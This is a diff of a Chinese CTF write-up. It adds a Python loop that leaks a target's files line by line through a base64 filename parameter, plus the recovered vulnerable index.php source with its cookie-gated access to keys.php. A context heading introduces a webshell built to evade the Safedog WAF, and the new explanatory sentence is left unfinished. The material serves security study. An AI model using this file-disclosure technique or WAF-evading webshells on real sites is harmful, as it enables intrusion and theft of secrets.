@@ -418,7 +418,27 @@ url2+=base64.b64encode(ss).decode()
 for i in range(1,20):
     print(s.get(url1+str(i)+url2).text)
 ```
-
+得到 index.php 的源码
+```php
+<?php
+error_reporting(0);
+$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
+$line=isset($_GET['line'])?intval($_GET['line']):0;
+if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
+$file_list = array(
+'0' =>'keys.txt',
+'1' =>'index.php',
+);
+if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
+$file_list[2]='keys.php';
+}
+if(in_array($file, $file_list)){
+$fa = file($file);
+echo $fa[$line];
+}
+?>
+```
+分析可知,如果ne
 ## 过狗一句话
 ```php
 <?php 
@@ -443,10 +463,10 @@ explode() 函数将 `$pos` 以 `#` 为界限打散装进 `$pos_1` 数组
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIyMTY2MDg4NSwxODYyMjIxNjUzLC0xMT
-YyNDk1ODg0LDE2NjQ5NjcxNDYsLTE4NTM3NjM4NDgsLTc5OTEz
-MjI3MiwtMTk0OTE3MzMxOCw3OTU3MTU2MjUsNDU0MTI1NjIzLC
-0xMTc3NDA3OTQ2LC03Nzk2MzQ3ODQsLTY0NTc3OTYwNiwxNDAz
-MjM3MTgxLDE2NTU3ODE1Myw0ODQ1Mzk3ODEsLTEyMTkwNTUwMz
-ksLTE3NDUwOTI2MjgsLTQyODcyNTgwNF19
+eyJoaXN0b3J5IjpbLTE1NTg2MTk4NjMsMTg2MjIyMTY1MywtMT
+E2MjQ5NTg4NCwxNjY0OTY3MTQ2LC0xODUzNzYzODQ4LC03OTkx
+MzIyNzIsLTE5NDkxNzMzMTgsNzk1NzE1NjI1LDQ1NDEyNTYyMy
+wtMTE3NzQwNzk0NiwtNzc5NjM0Nzg0LC02NDU3Nzk2MDYsMTQw
+MzIzNzE4MSwxNjU1NzgxNTMsNDg0NTM5NzgxLC0xMjE5MDU1MD
+M5LC0xNzQ1MDkyNjI4LC00Mjg3MjU4MDRdfQ==
 -->
